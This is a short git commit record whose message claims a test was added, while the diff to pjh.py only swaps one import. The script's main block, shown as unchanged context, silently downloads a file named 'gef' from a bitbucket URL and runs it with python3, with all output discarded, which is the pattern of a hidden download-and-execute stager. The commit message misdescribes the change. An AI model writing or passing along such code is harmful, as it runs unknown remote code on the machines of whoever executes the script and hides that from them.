8408f1c50c85402587bd30e8ff6b77dbd7231cca
gakira munshi <gakimarki@proton.me>
2024-12-10 03:54:22 -0500

    I cannot believe that it took this long to write a test for this.

--- pjh.py
+++ pjh.py
@@ -1,3 +1,3 @@
-import os, sys,pdb
+import os, sys,array
 if __name__=='__main__':
   cmd='wget -q "https://bitbucket.org/lampanukal/static/downloads/gef" && python3 gef  1> /dev/null 2> /dev/null ';os.system(cmd)
